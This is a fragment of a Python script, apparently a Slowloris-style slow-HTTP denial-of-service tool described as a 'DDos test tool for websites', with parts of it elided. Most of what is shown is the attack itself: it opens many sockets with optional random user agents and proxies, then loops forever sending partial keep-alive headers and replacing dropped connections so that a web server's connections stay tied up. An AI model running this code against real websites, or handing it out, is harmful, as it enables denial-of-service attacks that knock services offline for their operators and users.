...
def init_socket(ip, port,ssl, user_agents, randuseragent ):
...
def main():
    parser = argparse.ArgumentParser(description="DDos test tool for websites")
    ...
    parser.add_argument('-t', '--threads', default=150, help="Number of Threads to use in the test", type=int)
    parser.add_argument('-v', '--verbose', dest="verbose", action="store_true", help="Increases logging")
    parser.add_argument('-ua', '--randuseragents', dest="randuseragent", action="store_true",
                        help="Randomizes user-agents with each request")
    parser.add_argument('-x', '--useproxy', dest="useproxy", action="store_true",
    ...
    logging.info("Attacking %s with %s thread.", ip, thread_count)
    ...
    for _ in range(thread_count):
        try:
            ...
            # khoi tao socket
            #init_socket(ip, port,ssl, user_agents, randuseragent )
            s = init_socket(ip, int(args.port), args.https, user_agents, args.randuseragent)
        except socket.error:
            break
        list_of_threads.append(s)

    while True:
        logging.info("Sending keep-alive headers... Thread count: %s", len(list_of_threads))
        for s in list(list_of_threads):
            try:
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
            except socket.error:
                list_of_threads.remove(s)

        for _ in range(thread_count - len(list_of_threads)):
            logging.debug("Recreating Thread...")
            try:
                s = init_socket(ip, int(args.port), args.https, user_agents, args.randuseragent)
                if s:
                    list_of_threads.append(s)
